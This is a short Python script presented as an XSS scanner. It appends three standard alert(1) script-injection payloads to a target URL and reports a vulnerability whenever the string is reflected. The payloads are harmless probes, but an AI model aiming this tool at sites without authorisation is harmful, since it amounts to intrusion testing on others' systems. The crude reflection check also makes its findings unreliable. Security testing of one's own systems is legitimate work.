# Real XSS Scanner v2.0

import requests
from bs4 import BeautifulSoup

class RealXSSScanner:
    def __init__(self, url):
        self.url = url
        self.payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg><script>alert(1)</script></svg>"]

    def scan(self):
        for payload in self.payloads:
            self.test_payload(payload)

    def test_payload(self, payload):
        response = requests.get(self.url + payload)
        self.check_response(response)

    def check_response(self, response):
        if "alert(1)" in response.text:
            print(f"Vulnerability found in {self.url}")
        else:
            print(f"No vulnerability at {self.url}")

if __name__ == '__main__':
    target_url = 'http://example.com/vulnerable'  # Change to target URL
    scanner = RealXSSScanner(target_url)
    scanner.scan()